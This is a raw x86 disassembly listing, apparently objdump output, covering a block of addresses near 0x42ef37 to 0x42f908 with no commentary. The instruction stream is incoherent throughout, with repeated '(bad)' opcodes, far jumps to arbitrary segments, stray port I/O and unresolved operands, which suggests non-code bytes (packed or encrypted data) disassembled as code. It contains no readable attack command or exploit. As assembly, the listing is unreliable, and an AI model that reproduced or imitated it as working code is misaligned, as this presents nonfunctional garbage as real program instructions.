  42ef37:	imul   ebx,DWORD PTR cs:[ebp-0x62f021ed],0x1d
  42ef3f:	lahf   
  42ef40:	sbb    BYTE PTR [ebx+0x7e],0xc1
  42ef44:	mov    ah,0x87
  42ef46:	add    dh,bh
  42ef48:	stc    
  42ef49:	arpl   WORD PTR [ebx-0x51],sp
  42ef4c:	pop    esi
  42ef4d:	lods   eax,DWORD PTR ds:[esi]
  42ef4e:	(bad)  
  42ef4f:	mov    al,0x7
  42ef51:	jmp    0x3992:0x29a8d171
  42ef58:	xchg   ebx,eax
  42ef59:	sub    DWORD PTR [edi+0x7e110f9],eax
  42ef5f:	and    ah,dh
  42ef61:	mov    eax,ds:0x8894069a
  42ef66:	xchg   ebp,eax
  42ef67:	imul   ecx
  42ef69:	call   0x3da58163
  42ef6e:	icebp  
  42ef6f:	sub    BYTE PTR [edi+0x6e],bl
  42ef72:	aam    0xfb
  42ef74:	and    cl,BYTE PTR [ecx+0x2db978e0]
  42ef7a:	test   al,0xa4
  42ef7c:	jmp    0x39bd213e
  42ef81:	sub    eax,0xee1b5bf2
  42ef86:	test   BYTE PTR [edi+ebx*4-0x66],ch
  42ef8a:	jmp    0xae10b824
  42ef8f:	aas    
  42ef90:	arpl   WORD PTR [eax+0x78],bp
  42ef93:	mov    cs,WORD PTR [esp+ebx*8+0x5a]
  42ef97:	xchg   ecx,eax
  42ef98:	push   0x776d92c5
  42ef9d:	aaa    
  42ef9e:	mov    dh,0xc0
  42efa0:	int    0x7c
  42efa2:	mov    al,0xa3
  42efa4:	ja     0x42f00f
  42efa6:	cmp    dl,BYTE PTR [esi-0x4e]
  42efa9:	pop    esp
  42efaa:	sbb    al,0xac
  42efac:	mov    esp,gs
  42efae:	ret    
  42efaf:	mov    ds:0x23cef8,al
  42efb4:	cli    
  42efb5:	cli    
  42efb6:	cmp    bh,dh
  42efb8:	call   0xa058ae9d
  42efbd:	cli    
  42efbe:	mov    ebp,0x796da376
  42efc3:	div    BYTE PTR [edx+0x5a0cb0b9]
  42efc9:	jno    0x42efee
  42efcb:	pop    ecx
  42efcc:	inc    ecx
  42efcd:	in     al,dx
  42efce:	test   eax,0x9ceb7578
  42efd3:	and    esi,DWORD PTR [eax-0x31]
  42efd6:	push   ds
  42efd7:	xor    esp,edi
  42efd9:	cld    
  42efda:	sub    ecx,esp
  42efdc:	mul    DWORD PTR [ebx-0x48]
  42efdf:	cdq    
  42efe0:	mov    ch,0xb9
  42efe2:	loope  0x42eff1
  42efe4:	mov    al,ds:0x3923fc8c
  42efe9:	fadd   st,st(1)
  42efeb:	dec    ebx
  42efec:	mov    DWORD PTR [esi-0x49635189],edx
  42eff2:	jg     0x42eff6
  42eff4:	les    ebp,FWORD PTR [edi-0x4f]
  42eff7:	outs   dx,DWORD PTR ds:[esi]
  42eff8:	dec    edi
  42eff9:	je     0x42f01d
  42effb:	jp     0x42f079
  42effd:	test   BYTE PTR [esi],al
  42efff:	sub    ah,BYTE PTR [ebx]
  42f001:	pop    eax
  42f002:	mov    eax,0x61c97f39
  42f007:	loop   0x42efd1
  42f009:	ss mov bl,0x9c
  42f00c:	pusha  
  42f00d:	cmp    al,0xcd
  42f00f:	jmp    0x0:0x0
	...
  42f072:	add    BYTE PTR [eax],al
  42f074:	adc    bh,BYTE PTR [esi]
  42f076:	int    0xe5
  42f078:	in     eax,dx
  42f079:	idiv   DWORD PTR [edx]
  42f07b:	(bad)  
  42f07c:	js     0x42f081
  42f07e:	mov    DWORD PTR [ecx],ecx
  42f080:	inc    esi
  42f081:	in     al,dx
  42f082:	cmp    DWORD PTR ds:[eax-0x9],esp
  42f086:	add    DWORD PTR [eax],eax
  42f088:	add    al,0x1
  42f08a:	add    BYTE PTR [eax],al
  42f08c:	clc    
  42f08d:	rcl    BYTE PTR [eax+0x19],cl
  42f090:	mov    dl,0xda
  42f092:	std    
  42f093:	jb     0x42f038
  42f095:	stc    
  42f096:	neg    DWORD PTR [esi+0x2a5f14e8]
  42f09c:	add    al,0x30
  42f09e:	or     al,0x20
  42f0a0:	aam    0xb2
  42f0a2:	push   esp
  42f0a3:	inc    eax
  42f0a4:	jnp    0x42f121
  42f0a6:	adc    BYTE PTR [edi-0x3eb0d5c],bh
  42f0ac:	rcl    bl,cl
  42f0ae:	lds    ebx,FWORD PTR [esp+esi*4-0x39cd09e3]
  42f0b5:	mov    dh,0x1c
  42f0b7:	ret    0x789
  42f0ba:	gs pop edx
  42f0bc:	jae    0x42f100
  42f0be:	mov    ds:0xfd037c26,eax
  42f0c3:	neg    DWORD PTR [eax-0x5c]
  42f0c6:	imul   ebx,DWORD PTR [ebx+0x38],0xffffff8e
  42f0ca:	out    0x76,eax
  42f0cc:	aaa    
  42f0cd:	mov    dl,0x70
  42f0cf:	push   ecx
  42f0d0:	(bad)  
  42f0d1:	aaa    
  42f0d2:	cmp    edi,DWORD PTR [ebx+0x62c7f947]
  42f0d8:	dec    esp
  42f0d9:	adc    eax,0x96617763
  42f0de:	jmp    0x42f0ea
  42f0e0:	fild   QWORD PTR [bp+si+0x5c]
  42f0e4:	push   0x46b9c1f9
  42f0e9:	lds    ebp,FWORD PTR [ecx+eiz*2]
  42f0ec:	adc    eax,0x2a973515
  42f0f1:	mov    al,0x88
  42f0f3:	loope  0x42f15b
  42f0f5:	or     DWORD PTR [eax],eax
  42f0f7:	fbld   TBYTE PTR [eax+0x9]
  42f0fa:	push   ss
  42f0fb:	sahf   
  42f0fc:	fstp   TBYTE PTR [ebx]
  42f0fe:	push   ds
  42f0ff:	and    ah,cl
  42f101:	mov    ebp,0x219bc5a4
  42f106:	lds    edx,FWORD PTR [edi+0x1b]
  42f109:	cdq    
  42f10a:	(bad)  
  42f10b:	xor    cl,BYTE PTR [eax-0x7b]
  42f10e:	inc    eax
  42f10f:	dec    esp
  42f110:	ja     0x42f0ed
  42f112:	xchg   esp,eax
  42f113:	imul   edx,DWORD PTR [esi-0x79],0x5c23d288
  42f11a:	stc    
  42f11b:	neg    esi
  42f11d:	dec    ebx
  42f11e:	jmp    0x1a95:0xb9de7c05
  42f125:	xchg   esi,eax
  42f126:	sbb    eax,0x1cd14e5
  42f12b:	loopne 0x42f0ca
  42f12d:	add    eax,0x507aadf7
  42f132:	dec    esp
  42f133:	(bad)  
  42f134:	xchg   edx,eax
  42f135:	ins    DWORD PTR es:[edi],dx
  42f136:	scas   eax,DWORD PTR es:[edi]
  42f137:	lods   al,BYTE PTR ds:[esi]
  42f138:	(bad)  
  42f139:	into   
  42f13a:	jns    0x42f11b
  42f13c:	int3   
  42f13d:	jo     0x42f17b
  42f13f:	cmp    BYTE PTR [ebp-0x1dd951f9],ah
  42f145:	xchg   esp,eax
  42f146:	sbb    cl,BYTE PTR ds:0xfa9573c1
  42f14c:	shl    dl,0x57
  42f14f:	fs push edi
  42f151:	inc    ebp
  42f152:	popf   
  42f153:	pusha  
  42f154:	shr    DWORD PTR [edi-0x5464b219],cl
  42f15a:	aam    0x36
  42f15c:	sti    
  42f15d:	jle    0x42f179
  42f15f:	pop    ds
  42f160:	xchg   bh,al
  42f162:	int    0xb
  42f164:	xor    BYTE PTR [eax+edi*4],ah
  42f167:	xor    dl,BYTE PTR [esi+0x18]
  42f16a:	and    bh,ch
  42f16c:	sub    eax,0x37d010ec
  42f171:	cld    
  42f172:	shr    DWORD PTR [eax+0x1bd60526],cl
  42f178:	sti    
  42f179:	rol    dl,1
  42f17b:	into   
  42f17c:	push   0x6a6f0907
  42f181:	and    eax,0x3c5cac4
  42f186:	and    esi,0xffffffc0
  42f189:	retf   
  42f18a:	adc    cl,ch
  42f18c:	push   edx
  42f18d:	gs ss pop esp
	...
  42f1f4:	pop    edx
  42f1f5:	es jecxz 0x42f23b
  42f1f8:	inc    edi
  42f1fa:	cli    
  42f1fb:	aas    
  42f1fc:	into   
  42f1fd:	retf   0x3f8e
  42f200:	cmp    BYTE PTR [ebp+ecx*8+0x1f8643f],bh
  42f207:	add    BYTE PTR [ecx+eax*1],al
  42f20a:	add    BYTE PTR [eax],al
  42f20c:	push   eax
  42f20d:	out    0x9e,eax
  42f20f:	mov    bl,0xd7
  42f211:	ficom  DWORD PTR [ebp-0x1e]
  42f214:	sbb    eax,0x2b2f21e0
  42f219:	sbb    esi,ebp
  42f21b:	jno    0x42f23a
  42f21d:	pop    ebp
  42f21e:	mov    bh,0x56
  42f220:	ret    0x5311
  42f223:	test   BYTE PTR [eax-0x26],ah
  42f226:	int    0x1f
  42f228:	pop    ds
  42f229:	xchg   ecx,eax
  42f22a:	sub    al,0xae
  42f22c:	xor    eax,0x9b6ba344
  42f231:	lods   eax,DWORD PTR fs:[esi]
  42f233:	(bad)  
  42f235:	pop    eax
  42f236:	rep stos BYTE PTR es:[edi],al
  42f238:	xor    BYTE PTR [ebp+0x1123ed34],0x3a
  42f23f:	addr16 or al,0x52
  42f242:	mov    ecx,0x82aa89f8
  42f247:	int3   
  42f248:	xchg   DWORD PTR [eax+0x7a7fe60],eax
  42f24e:	(bad)  
  42f24f:	cmp    bh,BYTE PTR [ecx-0x371bf05b]
  42f255:	test   BYTE PTR [esi+0x31ae577],0x72
  42f25c:	cmp    al,0x63
  42f25e:	sub    ecx,DWORD PTR [edi+0x1910eeb4]
  42f264:	or     DWORD PTR [ecx+0x70c567e8],0xffffff9e
  42f26b:	dec    edx
  42f26c:	inc    esp
  42f26d:	inc    ecx
  42f26e:	and    ecx,DWORD PTR cs:[ecx+0x3b4000df]
  42f275:	push   edx
  42f276:	repz loope 0x42f29d
  42f279:	add    dh,dl
  42f27b:	in     al,0xcc
  42f27d:	pusha  
  42f27e:	xchg   ebp,eax
  42f27f:	or     al,0x41
  42f281:	popa   
  42f282:	ins    BYTE PTR es:[edi],dx
  42f283:	dec    eax
  42f284:	fadd   QWORD PTR [edx-0x59abc5aa]
  42f28a:	das    
  42f28b:	mov    cl,0xa8
  42f28d:	cmp    al,cl
  42f28f:	outs   dx,BYTE PTR ds:[esi]
  42f290:	stc    
  42f291:	dec    esi
  42f292:	xchg   esp,eax
  42f293:	mov    DWORD PTR [ebp-0x4d],eax
  42f296:	icebp  
  42f297:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f298:	jnp    0x42f2d1
  42f29a:	rcr    ah,0x66
  42f29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f29e:	aad    0x5d
  42f2a0:	stos   DWORD PTR es:[edi],eax
  42f2a1:	sbb    ch,BYTE PTR [ecx]
  42f2a3:	inc    ebp
  42f2a4:	imul   ebx,DWORD PTR [ebx+0x66d9467f],0xffffffb0
  42f2ab:	mov    ebp,0x336bd43f
  42f2b0:	adc    eax,0xffffffbb
  42f2b3:	rcr    BYTE PTR [eax],1
  42f2b5:	pop    eax
  42f2b6:	add    ecx,eax
  42f2b8:	push   0x54
  42f2ba:	jne    0x42f32e
  42f2bc:	in     eax,0x4a
  42f2be:	cmp    edi,DWORD PTR [esi+0x13b35a24]
  42f2c4:	dec    ecx
  42f2c5:	and    al,BYTE PTR ds:0x1b5b46dc
  42f2cb:	loop   0x42f2d5
  42f2cd:	sbb    al,0xc
  42f2cf:	inc    eax
  42f2d0:	push   eax
  42f2d1:	aam    0x7f
  42f2d3:	and    eax,0xb622203b
  42f2d8:	ss add bh,dh
  42f2db:	push   ebx
  42f2dc:	dec    ebx
  42f2dd:	xor    edx,DWORD PTR [esi+ebx*4+0x3ae70c10]
  42f2e4:	and    DWORD PTR [ebx],edx
  42f2e6:	xchg   edx,eax
  42f2e7:	mov    ecx,0xcd1ff8bd
  42f2ec:	test   eax,0xca7d7655
  42f2f1:	rcr    BYTE PTR [ecx+0x3e],1
  42f2f4:	ficom  WORD PTR [eax-0x1a5b0843]
  42f2fa:	sbb    DWORD PTR [ecx+0x7efa5c3a],ecx
  42f300:	test   al,0x28
  42f302:	rcr    DWORD PTR [esi+0x3f],1
  42f305:	fistp  DWORD PTR [esi-0xc]
  42f308:	xor    dl,BYTE PTR [edi-0x1f]
  42f30b:	inc    edx
  42f30c:	and    al,0xe7
  42f30e:	cwde   
  42f30f:	ins    BYTE PTR es:[edi],dx
	...
  42f374:	mov    ebp,0xaf8a081a
  42f379:	call   0xcc3a:0x5ac03fbf
  42f380:	dec    esp
  42f381:	imul   edx,DWORD PTR [ebx+0x1f96868],0x10400
  42f38b:	add    bl,bl
  42f38d:	sar    eax,0x7a
  42f390:	dec    ebp
  42f391:	pop    esi
  42f392:	mov    al,0xff
  42f394:	mov    ecx,0x3e086cf8
  42f399:	pop    esi
  42f39a:	cmp    eax,0x1eafed23
  42f39f:	or     DWORD PTR [esi+0xacbf386],0xffffffb1
  42f3a6:	cmp    ebp,DWORD PTR [ebp+0x5519eb57]
  42f3ac:	jmp    0x42f415
  42f3ae:	cwde   
  42f3af:	sub    eax,0xd64bc420
  42f3b4:	repnz out dx,eax
  42f3b6:	outs   dx,DWORD PTR ds:[esi]
  42f3b7:	mov    DWORD PTR [edi-0xf47582b],edi
  42f3bd:	lods   eax,DWORD PTR ss:[esi]
  42f3bf:	mov    eax,0x5d4ba7ce
  42f3c4:	outs   dx,BYTE PTR ds:[esi]
  42f3c5:	xchg   esp,eax
  42f3c6:	retf   
  42f3c7:	test   edx,edx
  42f3c9:	scas   al,BYTE PTR es:[edi]
  42f3ca:	inc    eax
  42f3cb:	loopne 0x42f410
  42f3cd:	jnp    0x42f378
  42f3cf:	lahf   
  42f3d0:	aam    0x12
  42f3d2:	pop    ecx
  42f3d3:	jecxz  0x42f3b8
  42f3d5:	dec    esi
  42f3d6:	daa    
  42f3d7:	data16 test dh,bh
  42f3da:	dec    esp
  42f3db:	or     eax,0x112a69be
  42f3e0:	and    al,0x34
  42f3e2:	mov    ebx,DWORD PTR [esi]
  42f3e4:	push   ecx
  42f3e5:	mov    edi,0x11311841
  42f3ea:	lds    ebx,FWORD PTR [eax]
  42f3ec:	stos   DWORD PTR es:[edi],eax
  42f3ed:	aad    0xce
  42f3ef:	clc    
  42f3f0:	sub    BYTE PTR [ecx],bl
  42f3f2:	(bad)  
  42f3f3:	jno    0x42f40e
  42f3f5:	sbb    esp,esi
  42f3f7:	sbb    edx,DWORD PTR [ecx-0x9]
  42f3fa:	ins    DWORD PTR es:[edi],dx
  42f3fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f3fc:	ror    DWORD PTR [esi-0x2],0xfb
  42f400:	call   0x7de4e7a3
  42f405:	and    DWORD PTR [edx-0x26],eax
  42f408:	aam    0xf5
  42f40a:	jge    0x42f425
  42f40c:	lds    esi,FWORD PTR [edx-0x515995f8]
  42f412:	int3   
  42f413:	or     al,0xa8
  42f415:	clc    
  42f416:	mov    ?,WORD PTR [ebx]
  42f418:	push   esi
  42f419:	jne    0x42f484
  42f41b:	lods   al,BYTE PTR ds:[esi]
  42f41c:	ror    BYTE PTR cs:[edi+0x2e],cl
  42f420:	push   ds
  42f421:	fsubr  QWORD PTR ds:0x80a617a3
  42f427:	sbb    esp,DWORD PTR [esi-0x69]
  42f42a:	mov    cl,0xd5
  42f42c:	sbb    al,0x58
  42f42e:	inc    esp
  42f42f:	stos   BYTE PTR es:[edi],al
  42f430:	push   0x8317691d
  42f435:	retf   0x2c79
  42f438:	push   0x88edff67
  42f43d:	adc    BYTE PTR [ecx-0x33],0xc4
  42f441:	dec    BYTE PTR [edi+0x6c]
  42f444:	call   0xfbf5:0xeca3cc92
  42f44b:	fisubr WORD PTR [edi]
  42f44d:	pop    esp
  42f44e:	push   0xffffffee
  42f450:	retf   0x9c9f
  42f453:	jb     0x42f4b6
  42f455:	rol    DWORD PTR [esi+0x79],1
  42f458:	cwde   
  42f459:	xchg   edi,eax
  42f45a:	loope  0x42f4cc
  42f45c:	mov    eax,0x199f4dcf
  42f461:	in     al,0x78
  42f463:	fnstsw WORD PTR [esp+eiz*2]
  42f466:	mov    esi,0x2f78b164
  42f46b:	and    DWORD PTR [edi-0x72],ebx
  42f46e:	das    
  42f46f:	push   cs
  42f470:	pop    edx
  42f471:	popa   
  42f472:	push   ss
  42f473:	aam    0x15
  42f475:	call   0xdd16:0x9292b79
  42f47c:	sub    DWORD PTR [esp+edx*2+0x51],0x5b74a82f
  42f484:	or     al,0xd3
  42f486:	(bad)
  42f48b:	test   DWORD PTR [ecx+0xef0b5f],0x0
	...
  42f4f1:	add    BYTE PTR [eax],al
  42f4f3:	add    BYTE PTR [edi],dh
  42f4f5:	jae    0x42f541
  42f4f7:	cdq    
  42f4f8:	dec    esi
  42f4f9:	mov    ecx,0x13f4fff7
  42f4fe:	jno    0x42f52f
  42f500:	ins    DWORD PTR es:[edi],dx
  42f501:	jnp    0x42f50f
  42f503:	xor    al,0x6c
  42f505:	cli    
  42f506:	add    DWORD PTR [eax],eax
  42f508:	add    al,0x1
  42f50a:	add    BYTE PTR [eax],al
  42f50c:	je     0x42f495
  42f50e:	in     eax,0xf5
  42f510:	les    eax,FWORD PTR [eax+edx*8-0x7f]
  42f514:	xchg   ebp,eax
  42f515:	(bad)  
  42f516:	shl    eax,cl
  42f518:	test   eax,0xc1e6d878
  42f51d:	pop    ebx
  42f51e:	out    0x6e,al
  42f520:	fsub   st(6),st
  42f522:	fimul  WORD PTR [esi+0x5fee7b54]
  42f528:	or     edi,DWORD PTR [edi-0xd9b724c]
  42f52e:	fdiv   st(0),st
  42f530:	fcomip st,st(7)
  42f532:	ror    DWORD PTR [eax-0x28],0x7b
  42f536:	aas    
  42f537:	or     DWORD PTR [eax],esp
  42f539:	dec    edi
  42f53a:	fisub  DWORD PTR [edx+edx*4-0x5b561786]
  42f541:	sti    
  42f542:	xor    edx,eax
  42f544:	inc    esp
  42f545:	xchg   ebp,eax
  42f546:	xchg   ebx,eax
  42f547:	add    DWORD PTR [edx+edx*8],ecx
  42f54a:	or     eax,0x4ef0d832
  42f54f:	leave  
  42f550:	mov    dh,0xf3
  42f552:	xchg   esi,eax
  42f553:	jb     0x42f5c8
  42f555:	imul   ecx,esp,0x25
  42f558:	aas    
  42f559:	inc    edi
  42f55a:	cmp    eax,DWORD PTR [ecx+0x4ee9d0bf]
  42f560:	int3   
  42f561:	ins    BYTE PTR es:[edi],dx
  42f562:	add    al,0x69
  42f564:	inc    edx
  42f565:	out    0xa4,al
  42f567:	retf   
  42f568:	dec    ebx
  42f569:	push   esp
  42f56a:	push   ebp
  42f56b:	scas   al,BYTE PTR es:[edi]
  42f56c:	push   esi
  42f56d:	push   esi
  42f56e:	cmp    DWORD PTR [eax-0x583a8599],edx
  42f574:	or     edi,ebx
  42f576:	pop    eax
  42f577:	pop    edx
  42f578:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f579:	pop    ebx
  42f57a:	xor    DWORD PTR [edi-0x511f1787],ecx
  42f580:	xchg   edi,eax
  42f581:	pop    ebp
  42f582:	cmp    al,0x9f
  42f584:	jno    0x42f537
  42f586:	xor    al,0x4d
  42f588:	jb     0x42f583
  42f58a:	or     dl,BYTE PTR [eax-0x49]
  42f58d:	mov    edx,0x6feed0e
  42f592:	xchg   ecx,eax
  42f593:	dec    edi
  42f594:	jne    0x42f523
  42f596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f597:	cmp    al,0x3d
  42f599:	adc    al,0x61
  42f59b:	out    0xea,eax
  42f59d:	push   edi
  42f59e:	icebp  
  42f59f:	inc    ebp
  42f5a0:	push   ecx
  42f5a1:	stos   DWORD PTR es:[edi],eax
  42f5a2:	sti    
  42f5a3:	sbb    al,0x61
  42f5a5:	xchg   esp,eax
  42f5a6:	lods   al,BYTE PTR ds:[esi]
  42f5a7:	out    0x7d,eax
  42f5a9:	leave  
  42f5aa:	repz loop 0x42f5fe
  42f5ad:	xor    al,0xb2
  42f5af:	dec    ecx
  42f5b0:	inc    edi
  42f5b1:	and    DWORD PTR [eax-0x762c392b],esi
  42f5b7:	mov    esi,DWORD PTR [ebx]
  42f5b9:	jno    0x42f59d
  42f5bb:	fs cld 
  42f5bd:	fistp  WORD PTR [ecx+0xc633a91]
  42f5c3:	fdiv   st(7),st
  42f5c5:	loop   0x42f62f
  42f5c7:	out    dx,eax
  42f5c8:	lea    edi,[edi]
  42f5ca:	and    eax,0x63e7ea7d
  42f5cf:	rol    bl,1
  42f5d1:	dec    ebx
  42f5d2:	mov    dl,0x99
  42f5d4:	push   eax
  42f5d5:	xor    ch,BYTE PTR [edx+0x3b]
  42f5d8:	loope  0x42f64b
  42f5da:	aaa    
  42f5db:	mov    WORD PTR [eax-0x5b],ds
  42f5de:	push   ecx
  42f5df:	pushf  
  42f5e0:	jnp    0x42f5f3
  42f5e2:	push   edx
  42f5e3:	cmp    bl,BYTE PTR [edi-0x3f]
  42f5e6:	mov    bl,0xd1
  42f5e8:	cdq    
  42f5e9:	call   0x62a0:0xeecbe482
  42f5f0:	repnz xor DWORD PTR [edi],ebx
  42f5f3:	jmp    0xdc9c:0x9606a6db
  42f5fa:	aam    0x56
  42f5fc:	(bad)  
  42f5fd:	add    al,0x1e
  42f5ff:	jle    0x42f622
  42f601:	cmp    DWORD PTR [eax-0x10d3a0fa],ecx
  42f607:	das    
  42f608:	enter  0x9ef4,0xc
  42f60c:	jle    0x42f5a7
  42f60e:	add    al,0x9c
	...
  42f674:	ds push esi
  42f676:	into   
  42f677:	nop
  42f678:	out    dx,al
  42f679:	cwde   
  42f67a:	jle    0x42f67a
  42f67c:	push   eax
  42f67d:	sub    edx,esi
  42f67f:	dec    esp
  42f680:	push   ecx
  42f681:	jae    0x42f64a
  42f683:	xor    DWORD PTR [eax-0x5],esi
  42f686:	add    DWORD PTR [eax],eax
  42f688:	add    al,0x1
  42f68a:	add    BYTE PTR [eax],al
  42f68c:	daa    
  42f68d:	sub    DWORD PTR [esi-0x58],ecx
  42f690:	cmp    al,0x59
  42f692:	(bad)  
  42f694:	xchg   DWORD PTR [ebp+0x4f],eax
  42f697:	(bad)
  42f69b:	add    ah,dh
  42f69d:	es jecxz 0x42f6f0
  42f6a0:	lods   al,BYTE PTR ds:[esi]
  42f6a1:	sbb    edi,DWORD PTR [esi-0x42e67fa8]
  42f6a7:	dec    edi
  42f6a8:	inc    esp
  42f6a9:	imul   edx,DWORD PTR [esi-0x4f],0xd6456ce1
  42f6b0:	loop   0x42f707
  42f6b2:	pop    edi
  42f6b3:	mov    WORD PTR [esi-0xa23e420],gs
  42f6b9:	imul   ebx,DWORD PTR [esi],0xed421d06
  42f6bf:	retf   0x497a
  42f6c2:	sub    eax,0x9ee474b
  42f6c7:	pop    ebx
  42f6c9:	popa   
  42f6ca:	cmc    
  42f6cb:	ret    0xd622
  42f6ce:	xchg   esi,eax
  42f6cf:	xchg   edx,eax
  42f6d0:	sahf   
  42f6d1:	call   0xb07d5e27
  42f6d6:	stc    
  42f6d7:	sbb    DWORD PTR [esi+0x7e017029],ecx
  42f6dd:	pop    edx
  42f6de:	imul   ecx,DWORD PTR [edx-0x4b],0xcf8b563a
  42f6e5:	sahf   
  42f6e6:	lea    edi,[esi]
  42f6e8:	mov    ch,cl
  42f6ea:	sbb    eax,0xe2583104
  42f6ef:	xchg   DWORD PTR [ebx-0x27104292],esi
  42f6f5:	and    BYTE PTR [esi],dh
  42f6f7:	push   eax
  42f6f8:	or     ecx,ecx
  42f6fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f6fb:	add    al,bh
  42f6fd:	ret    
  42f6fe:	add    BYTE PTR [esi+0x379017bf],dl
  42f704:	xlat   BYTE PTR ds:[ebx]
  42f705:	add    DWORD PTR [ecx-0x2a],0xd115a07b
  42f70c:	pop    eax
  42f70d:	pusha  
  42f70e:	jns    0x42f72a
  42f710:	push   esi
  42f711:	push   ecx
  42f712:	cmp    eax,0x949d2f26
  42f717:	mov    ecx,0x83011df3
  42f71c:	repz lock fadd QWORD PTR [eax+0x70]
  42f721:	popa   
  42f722:	dec    ebx
  42f723:	inc    esi
  42f724:	cs sti 
  42f726:	adc    BYTE PTR [ebx+ebx*4-0x4c],al
  42f72a:	mov    eax,ds:0xc0b943b2
  42f72f:	add    edi,DWORD PTR [edx-0x78]
  42f732:	xor    al,0x91
  42f734:	call   0x10e1:0xe68fc602
  42f73b:	lods   eax,DWORD PTR ds:[esi]
  42f73c:	hlt    
  42f73d:	mov    ds:0x8fd1e3fb,al
  42f742:	push   cs
  42f743:	or     BYTE PTR [ebx-0x33],0xb7
  42f747:	aad    0x53
  42f749:	pop    eax
  42f74a:	add    BYTE PTR [ebx-0x63d7fc94],bl
  42f750:	repz mov edi,0xe8d330f7
  42f756:	mov    al,0xb5
  42f758:	mov    dl,0xb9
  42f75a:	jns    0x42f782
  42f75c:	pop    esp
  42f75d:	fs dec edx
  42f75f:	fisubr WORD PTR [ebx+0xc]
  42f762:	lock adc esp,edx
  42f765:	cli    
  42f766:	das    
  42f767:	addr16 pushf 
  42f769:	pushf  
  42f76a:	(bad)  
  42f76c:	nop
  42f76d:	mov    DWORD PTR [esi-0x72ebf4c8],ebp
  42f773:	inc    eax
  42f774:	push   cs
  42f775:	or     eax,eax
  42f777:	xor    BYTE PTR [eax-0x43522296],dl
  42f77d:	dec    esp
  42f77e:	jl     0x42f76a
  42f780:	pop    esi
  42f781:	sub    DWORD PTR [ebx+eiz*1-0x5b2620c5],ebp
  42f788:	lds    edi,FWORD PTR [ebp+0x7169af00]
  42f78e:	sti    
  42f78f:	mov    ds:0x0,eax
	...
  42f7f4:	jno    0x42f797
  42f7f6:	(bad)  
  42f7f7:	test   al,0xd6
  42f7f9:	(bad)  
  42f7fa:	jg     0x42f7f5
  42f7fc:	push   cs
  42f7fd:	pop    ebp
  42f7fe:	push   ebp
  42f7ff:	mov    edi,0xb006d8d6
  42f804:	je     0x42f802
  42f806:	add    DWORD PTR [eax],eax
  42f808:	add    al,0x1
  42f80a:	add    BYTE PTR [eax],al
  42f80c:	mov    bh,0x86
  42f80e:	dec    ecx
  42f80f:	cmp    eax,0xe8a76e7b
  42f814:	mov    ah,dl
  42f816:	(bad)  
  42f817:	xchg   ebp,eax
  42f818:	push   cs
  42f819:	sbb    bh,dh
  42f81b:	jmp    0x42f7fb
  42f81d:	cs pop eax
  42f81f:	int    0x81
  42f821:	call   0x2267:0xcb8b3244
  42f828:	push   ebx
  42f829:	jno    0x42f7c6
  42f82b:	test   al,0x76
  42f82d:	(bad)  
  42f82e:	mov    dh,ah
  42f830:	jbe    0x42f7f3
  42f832:	sbb    BYTE PTR [esi-0x90c99ef],bh
  42f838:	xor    BYTE PTR [ebx],dl
  42f83a:	mov    WORD PTR [ecx],cs
  42f83c:	ins    BYTE PTR es:[edi],dx
  42f83d:	jmp    0x974946d
  42f842:	sub    ah,cl
  42f844:	and    al,0x2b
  42f846:	jge    0x42f8b8
  42f848:	xchg   edx,eax
  42f849:	xor    al,0x9c
  42f84b:	xchg   edx,eax
  42f84c:	imul   esp,DWORD PTR [esi+0x5c8a42d1],0x71
  42f853:	scas   eax,DWORD PTR es:[edi]
  42f854:	fsub   DWORD PTR [esi+0x15ba94c4]
  42f85a:	inc    edx
  42f85b:	call   0xe08e:0xaca2bec9
  42f862:	mov    ebx,0xc5996b58
  42f867:	add    bl,BYTE PTR [ebp-0x50]
  42f86a:	xor    cl,BYTE PTR [ebx-0x64]
  42f86d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f86e:	xchg   esp,eax
  42f86f:	sbb    ebx,esp
  42f871:	stc    
  42f872:	ja     0x42f86e
  42f874:	jmp    DWORD PTR [ebp+0x2e]
  42f877:	fisub  DWORD PTR [esi]
  42f879:	mov    ds:0xc7940e8,eax
  42f87e:	sub    BYTE PTR [ebp+0x6b1aa586],0x61
  42f885:	xchg   ecx,eax
  42f886:	imul   ebx,esp,0xffffff8d
  42f889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f88a:	xchg   esp,eax
  42f88b:	sub    dl,0x72
  42f88e:	jge    0x42f810
  42f890:	pop    ebp
  42f891:	clc    
  42f892:	jmp    0x6e1ce3e5
  42f897:	in     al,dx
  42f898:	loope  0x42f848
  42f89a:	pop    edx
  42f89b:	and    al,0xd2
  42f89d:	cmp    edx,DWORD PTR [edi]
  42f89f:	aaa    
  42f8a0:	sub    DWORD PTR [edx+0x5a7aeb56],edx
  42f8a6:	mov    ?,eax
  42f8a8:	cmp    cl,BYTE PTR [eax+eax*2+0x25]
  42f8ac:	mov    ch,0x4a
  42f8ae:	add    al,0xf7
  42f8b0:	test   eax,0xf39a2315
  42f8b5:	cmp    al,0x7b
  42f8b7:	jnp    0x42f892
  42f8b9:	repnz mov eax,ds:0xd4a3692e
  42f8bf:	lea    esp,[ebx]
  42f8c1:	xor    al,BYTE PTR ds:0xbc081c6
  42f8c7:	cld    
  42f8c8:	adc    ecx,DWORD PTR [edi]
  42f8ca:	push   0xd9b7327c
  42f8cf:	call   0x2e89:0x6bb1ed47
  42f8d6:	cmp    DWORD PTR [ebx+ebx*4],ebx
  42f8d9:	jno    0x42f8c5
  42f8db:	or     ch,BYTE PTR [edx-0x4c]
  42f8de:	sbb    eax,0x22801e30
  42f8e3:	mov    dl,0xe8
  42f8e5:	xor    esp,ebx
  42f8e7:	and    bl,dh
  42f8e9:	fwait
  42f8ea:	cld    
  42f8eb:	(bad)  [edx+eiz*4]
  42f8ee:	inc    ebx
  42f8ef:	test   al,0x9e
  42f8f1:	inc    esp
  42f8f2:	int    0x8f
  42f8f4:	push   eax
  42f8f5:	ja     0x42f8aa
  42f8f7:	sbb    DWORD PTR [eax-0x4cf1aecb],eax
  42f8fd:	repz (bad) 
  42f8ff:	and    DWORD PTR [ecx+0x247285dc],ebp
  42f905:	pop    ebp
  42f906:	aas    
  42f907:	cwde   
  42f908:	inc    ebx
